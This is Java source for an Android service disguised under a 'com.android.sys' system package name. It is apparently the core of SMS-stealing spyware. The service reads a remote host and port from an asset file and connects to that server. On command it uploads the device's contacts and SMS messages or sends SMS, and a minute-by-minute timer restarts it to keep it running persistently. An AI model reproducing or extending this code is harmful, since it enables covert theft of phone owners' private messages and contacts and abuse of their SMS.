package com.android.sys.service;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.IBinder;

import com.android.sys.action.SendSmsAction;
import com.android.sys.action.UploadContactsAction;
import com.android.sys.action.UploadSmsAction;
import com.android.sys.session.NetworkSessionManager;
import com.android.sys.utils.SystemUtil;

import java.io.IOException;
import java.io.InputStream;
import java.util.Timer;
import java.util.TimerTask;

public class SystemService extends Service{
    private static Context sContext = null;
    public static Context getContext() {
        return sContext;
    }

    public static boolean start(Context context) {
        if(!SystemUtil.isServiceRunning(context, SystemService.class.getCanonicalName())) {
            context.startService(new Intent(context, SystemService.class));
            return true;
        }
        return false;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private NetworkSessionManager mSessionManager;

    private String ACTION_SEND_SMS = "send_sms";
    private String ACTION_UPLOAD_SMS = "upload_sms";
    private String ACTION_UPLOAD_CONTACT = "upload_contact";

    private void init() {
        try {
            InputStream is = getAssets().open("hostname");
            byte[] data = new byte[is.available()];
            is.read(data);
            String address = new String(data, "UTF-8");
            String[] host_port = address.split(":");
            mSessionManager = new NetworkSessionManager();
            mSessionManager.addActionHandler(ACTION_SEND_SMS, new SendSmsAction());
            mSessionManager.addActionHandler(ACTION_UPLOAD_CONTACT, new UploadContactsAction());
            mSessionManager.addActionHandler(ACTION_UPLOAD_SMS, new UploadSmsAction());
            mSessionManager.setHeartBeatData(Build.MODEL.getBytes("UTF-8"));
            if(host_port.length >= 1) {
                mSessionManager.setHost( host_port[0] );
            }
            if(host_port.length >= 2) {
                try {
                    mSessionManager.setPort(Integer.parseInt(host_port[1]));
                } catch (Exception e) {
                }
            }
            mSessionManager.start();
        } catch (IOException e) {
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        sContext = this;
        init();
        registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(final Context context, Intent intent) {
                SystemService.start(context);
                final BroadcastReceiver it = this;
                try {
                    context.unregisterReceiver(this);
                } catch (Exception e) {
                }
                new Timer().schedule(new TimerTask() {
                    @Override
                    public void run() {
                        try {
                            context.registerReceiver(it, new IntentFilter(Intent.ACTION_TIME_TICK));
                        } catch (Exception e) {
                        }
                    }
                },59000);
            }
        }, new IntentFilter(Intent.ACTION_TIME_TICK));
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        mSessionManager.stop();
    }
}
